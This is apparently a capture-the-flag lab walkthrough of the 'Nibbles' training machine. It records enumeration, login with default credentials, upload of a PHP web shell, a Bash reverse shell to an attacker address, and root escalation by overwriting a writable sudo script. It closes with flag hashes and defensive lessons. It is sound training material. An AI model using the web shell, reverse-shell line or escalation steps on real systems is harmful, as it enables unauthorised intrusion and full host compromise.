# Sections 15–19: Nibbles Machine

**Module:** 02 — Getting Started  
**Machine:** Nibbles  
**Topics:** Nmap Enumeration, Web Enumeration, WordPress-Style CMS, File Upload Exploitation, Reverse Shell, Linux Privilege Escalation  
**Status:** Walkthrough documented

---

## 1. Nmap Enumeration

The first step was to identify the services exposed by the target machine.

### Command

```bash
nmap -sC -sV <TARGET_IP>
```

### Observed Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Additional service information:

```text
22/tcp:
OpenSSH 7.2p2 Ubuntu 4ubuntu2.2

80/tcp:
Apache httpd 2.4.18 (Ubuntu)
```

### Explanation

The scan identified two open TCP ports:

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 |
| 80 | HTTP | Apache httpd 2.4.18 (Ubuntu) |

The `-sC` option runs Nmap's default scripts, while `-sV` attempts to identify service versions.

The web service on port 80 became the primary focus for further enumeration.

---

## 2. Web Enumeration

### Step 1: Inspect the Homepage Source

The homepage displayed:

```html
<b>Hello world!</b>
```

Further inspection of the HTML source revealed this comment:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

### Explanation

HTML comments are not normally displayed on the webpage, but they can be discovered by inspecting the page source.

The comment revealed a possible application directory:

```text
/nibbleblog/
```

This provided a useful starting point for further enumeration.

### Step 2: Identify the Application

Visiting `/nibbleblog/` revealed that the application was Nibbleblog, a PHP-based blogging CMS.

Research into the application identified a file-upload vulnerability associated with Nibbleblog version 4.0.3.

**Public exploit reference:**

[Rapid7 — Nibbleblog File Upload Exploit](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/)

The vulnerability requires authenticated access to the application.

### Step 3: Discover the Login Credentials

The administrative login page was located at:

```text
/nibbleblog/admin.php
```

The following credentials were tried:

| Username | Password |
|---|---|
| `admin` | `nibbles` |

The credentials were accepted, providing access to the administrative interface.

---

## 3. Web Application Exploitation

### Step 1: Prepare the PHP Web Shell

A PHP shell was created with the following content:

**Filename:** `shell.php`

```php
<?php system($_REQUEST['cmd']); ?>
```

### Explanation

The PHP `system()` function executes a system command.

The `$_REQUEST['cmd']` variable allows a command to be supplied through an HTTP request parameter named `cmd`.

For example, requesting the uploaded PHP file with `cmd=id` causes the server to execute the `id` command.

This type of file is commonly called a web shell.

### Step 2: Upload the Shell

After authenticating to the Nibbleblog administration interface, the following menu was used:

```text
Plugins > My image > Configure
```

The `shell.php` file was uploaded through the plugin.

### Step 3: Verify Command Execution

The uploaded file was accessed using:

```text
/nibbleblog/content/private/plugins/my_image/image.php?cmd=id
```

**Observed Output**

```text
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

### Explanation

The output of `id` confirmed that the web server was executing commands under the `nibbler` account.

This established initial command execution on the target.

The account was not root, so further privilege escalation was necessary.

---

## 4. Get the User Flag

### Step 1: Start a Listener

A listener was prepared on the attacking machine:

```bash
nc -lvnp 4444
```

The listener waits for an incoming connection on port `4444`.

### Step 2: Trigger the Reverse Shell

The following request was used to execute a Bash reverse shell:

```text
/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.161%2F4444%200%3E%261%27
```

The encoded command connects back to the attacking machine at `10.10.15.161` on port `4444`.

### Explanation

A reverse shell allows the target machine to initiate a connection back to the attacker's listener.

After the connection was established, an interactive shell was available as `nibbler`.

### Step 3: Retrieve the User Flag

**Observed Prompt**

```text
nibbler@Nibbles:/home/nibbler$
```

**Command**

```bash
cat user.txt
```

**Observed Output**

```text
79c03865431abf47b90ef24b9695e148
```

**User Flag**

```text
79c03865431abf47b90ef24b9695e148
```

---

## 5. Privilege Escalation

After obtaining access as `nibbler`, the next objective was to identify a way to execute commands as root.

### Step 1: Enumerate Sudo Permissions

**Command**

```bash
sudo -l
```

**Observed Output**

```text
User nibbler may run the following commands on Nibbles:

(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

### Explanation

The output shows that `nibbler` can execute the following script as root without entering a password:

```text
/home/nibbler/personal/stuff/monitor.sh
```

The important details are:

- `(root)` means the command can run with root privileges.
- `NOPASSWD` means no password is required for this permitted command.
- The permitted command is the `monitor.sh` script.

This is a potentially dangerous sudo configuration, especially if the permitted script can be modified by the unprivileged user.

### Step 2: Extract and Inspect the Script

The `personal.zip` archive was extracted in the `/home/nibbler` directory.

The script was located at:

```text
/home/nibbler/personal/stuff/monitor.sh
```

Its contents were inspected with:

```bash
cat ./personal/stuff/monitor.sh
```

The supplied script was a Linux system-monitoring Bash script. It collected information such as:

- Operating system details
- Kernel version
- Hostname
- Network addresses
- DNS configuration
- Logged-in users
- Memory and swap usage
- Disk usage
- System load and uptime

### Step 3: Identify the Writable Script

The important finding was that `nibbler` had write access to the script that sudo allowed to run as root.

This creates a privilege-escalation opportunity:

1. The script is writable by `nibbler`.
2. Sudo permits that same script to execute as root.
3. Its contents can therefore be changed.
4. When executed through the permitted sudo rule, the modified script runs with root privileges.

This is an example of privilege escalation through an insecure sudo configuration and writable script.

### Step 4: Modify the Script

The original monitoring script was replaced with:

```bash
echo -e '#!/bin/bash\nbash -p' > /home/nibbler/personal/stuff/monitor.sh
```

**Explanation**

The replacement script contains:

```bash
#!/bin/bash
bash -p
```

- `#!/bin/bash` specifies Bash as the script interpreter.
- `bash -p` starts Bash in privileged mode, preserving the effective privileges supplied by the privileged execution context.

### Step 5: Execute the Modified Script as Root

**Command**

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

The command started a root shell.

**Verification**

```bash
id
```

**Observed Output**

```text
uid=0(root) gid=0(root) groups=0(root)
```

The output confirms that the shell was running with root privileges.

---

## 6. Get the Root Flag

Once root access was obtained, the root flag was retrieved.

**Command**

```bash
cat /root/root.txt
```

**Observed Output**

```text
de5e5d6619862a8aa5b9b212314e0cdd
```

**Root Flag**

```text
de5e5d6619862a8aa5b9b212314e0cdd
```

---

## 7. Final Results

| Objective | Result |
|---|---|
| Identify exposed services | SSH and HTTP |
| Identify the web application | Nibbleblog |
| Discover the application login | `/nibbleblog/admin.php` |
| Authenticate to the application | `admin:nibbles` |
| Exploit the file-upload weakness | PHP web shell uploaded |
| Obtain initial command execution | `nibbler` |
| Retrieve user flag | Successful |
| Identify sudo permissions | `monitor.sh` executable as root |
| Identify privilege-escalation weakness | Writable root-executed script |
| Obtain root access | Successful |
| Retrieve root flag | Successful |

## 8. Security Lessons

### Web Application Security

- HTML comments can disclose hidden application paths.
- Identify CMS products and versions during web enumeration.
- Outdated plugins can expose applications to known vulnerabilities.
- File-upload functionality should validate file types and prevent executable uploads.
- Authentication should not be treated as sufficient protection against insecure file-upload functionality.

### Linux Privilege Escalation

- Always inspect sudo permissions with `sudo -l`.
- A passwordless sudo rule can still introduce serious security risks.
- Never allow unprivileged users to modify scripts that execute with root privileges.
- Review file ownership and permissions when investigating privileged scripts.
- Verify privilege escalation with `id` rather than assuming a command succeeded.

### Overall Attack Path

```text
Nmap Enumeration
       |
       v
Web Enumeration
       |
       v
Identify Nibbleblog
       |
       v
Authenticate to Admin Panel
       |
       v
Exploit File Upload
       |
       v
PHP Web Shell
       |
       v
Initial Access as nibbler
       |
       v
Retrieve User Flag
       |
       v
Enumerate Sudo Permissions
       |
       v
Discover Writable Root-Executed Script
       |
       v
Modify monitor.sh
       |
       v
Execute Script Through Sudo
       |
       v
Root Access
       |
       v
Retrieve Root Flag
```

---

[Back to Module Index](./README.md)
